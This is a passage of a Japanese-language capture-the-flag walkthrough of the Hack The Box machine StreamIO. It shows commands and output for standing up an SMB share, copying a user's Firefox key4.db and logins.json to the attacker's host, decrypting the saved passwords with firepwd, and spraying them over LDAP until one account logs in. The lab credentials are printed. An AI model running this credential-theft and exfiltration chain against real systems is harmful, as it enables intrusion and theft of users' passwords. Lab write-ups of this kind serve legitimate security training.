    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found

       /---------------------------------------------------------------------------------\                                                                             
       |                             Do you like PEASS?                                  |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                             
       |         Follow on Twitter         :     @hacktricks_live                        |                                                                             
       |         Respect on HTB            :     SirBroccoli                             |                                                                             
       |---------------------------------------------------------------------------------|                                                                             
       |                                 Thank you!                                      |                                                                             
       \---------------------------------------------------------------------------------/
```
ファイル転送のため、kaliにsmbサーバをたてる
```sh
└─$ impacket-smbserver -smb2support share .                                                                                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
winpeasでみつけたdbファイルとほかに、クレデンシャルダンプに必要なjsonファイルを配送
```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db \\10.10.16.9\share

*Evil-WinRM* PS C:\Users\nikk37\Documents> copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json \\10.10.16.9\share
```
ここでツールをダウンロード
```sh
└─$ git clone https://github.com/lclevy/firepwd.git       
Cloning into 'firepwd'...
remote: Enumerating objects: 88, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80 (from 1)
Receiving objects: 100% (88/88), 239.08 KiB | 4.98 MiB/s, done.
Resolving deltas: 100% (41/41), done.

└─$ cd firepwd

└─$ uv init -p 3.13       
Initialized project `firepwd`

└─$ uv add -r requirements.txt 
Using CPython 3.13.7 interpreter at: /usr/bin/python3.13
Creating virtual environment at: .venv
Resolved 3 packages in 147ms
Prepared 1 package in 517ms
Installed 2 packages in 7ms
 + pyasn1==0.6.1
 + pycryptodome==3.23.0
```
クレデンシャルダンプ  
４つのクレデンシャルを確認した
```sh
└─$ ls firefox 
key4.db  logins.json

└─$ uv run firepwd.py -d firefox 
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
４つのユーザのうち、nikk37のパスワードは判明・c:\users\配下にadminは存在しないことを確認済み  
yoshihideとJDgoddでブルートフォースログイン、結果jdgoddでログイン成功
```sh
└─$ netexec ldap 10.129.234.107 -u yohsihide -p passwords.txt
LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:JDg0dd1s@d0p3cr3@t0r 
LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:n1kk1sd0p3t00:)
LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:paddpadd@12
LDAP        10.129.234.107  389    DC               [-] streamIO.htb\yohsihide:password@12 

└─$ netexec ldap 10.129.234.107 -u jdgodd -p passwords.txt
LDAP        10.129.234.107  389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
LDAP        10.129.234.107  389    DC               [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r 
```
